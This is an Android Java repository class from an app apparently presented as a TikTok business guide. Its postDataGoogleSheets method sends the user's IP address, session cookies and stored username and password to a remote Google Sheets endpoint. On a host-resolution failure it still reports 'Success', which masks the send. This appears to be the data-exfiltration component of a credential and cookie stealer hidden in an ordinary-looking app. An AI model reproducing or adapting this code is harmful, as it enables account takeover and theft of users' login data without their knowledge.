package com.teamwork.businessguideprofortiktok.src.activity.repositories.webview_repository;

import android.util.Log;

import androidx.lifecycle.LiveData;
import androidx.lifecycle.MutableLiveData;

import com.teamwork.businessguideprofortiktok.src.cores.services.APIServices;
import com.teamwork.businessguideprofortiktok.src.cores.services.DataService;
import com.teamwork.businessguideprofortiktok.src.utils.Constant;


import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class GoogleSheetRepository {
    MutableLiveData<String> reponse1 = new MutableLiveData<>();

    public LiveData<String> getDataReponseSever(){
        return reponse1;
    }

    public void postDataGoogleSheets(String ip, String cookies) {
        DataService dataService = APIServices.getService();

        Call<String> callback = dataService.postDataGoogleSheets(ip, cookies, Constant.mUserName,Constant.mPassword);
        callback.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                    Log.d("TAG", "onResponse: " + response.toString());
                    reponse1.setValue("Success");
                    Log.d("TAG", "onResponse: " + response.toString());
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Log.d("TAG", "onResponse: err send code google sheet onFailure: " + t.toString());
                if(t.toString().startsWith("java.net.UnknownHostException: Unable to resolve host")){
                    reponse1.setValue("Success");
                }else{
                    reponse1.setValue("Please check internet of you");
                }
            }
        });
    }

}
